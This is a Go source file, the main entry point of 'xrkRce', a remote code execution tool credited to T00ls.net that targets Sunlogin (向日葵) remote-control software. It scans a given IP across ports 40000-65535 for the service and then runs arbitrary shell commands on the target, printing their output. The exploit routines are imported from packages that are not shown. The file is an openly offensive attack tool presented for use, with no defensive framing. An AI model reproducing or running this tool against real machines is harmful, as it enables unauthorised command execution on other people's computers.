package main

import (
	"flag"
	"fmt"
	"time"
	"xrkRce/config"
	"xrkRce/find"
	"xrkRce/rce"
)

func init() {
	logo := `

╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐
╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤ 
╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘

						by:T00ls.net
						向日葵Rce
----------------------------------------------
`
	fmt.Println(logo)

}
func main() {
	ip := flag.String("h", "", "ip")
	port := flag.String("p", "40000-65535", "port:40000-65535")
	runtype := flag.String("t", "scan", "type")
	cmdstr := flag.String("c", "", "cmd")
	x := flag.Int("x",10,"x")
	flag.Parse()
	if *ip!=""{
		switch *runtype {
		case "scan":
			fmt.Println("[Info] 正在扫描中,请稍等....")
			config.SetIp(*ip)
			start := time.Now()
			find.RootScan(*ip, *port,*x)
			end := time.Since(start)
			fmt.Println("花费时间为:", end)
			fmt.Println("----------------------------------------------")
		//扫描
		case "rce":
			if *ip != "" && *port != "" && *cmdstr != "" {
				config.SetIp(*ip)
				config.SetPort(*port)
				str := rce.RunCmd(*cmdstr)
				if str != "" {
					fmt.Println("[Info] 命令执行成功:\n", str)
				} else {
					fmt.Println("[Info] 命令执行完毕,但是没有回显.")
				}
			}
		//利用
		default:
			flag.Usage()

		}
	}else {
		flag.Usage()
	}

}
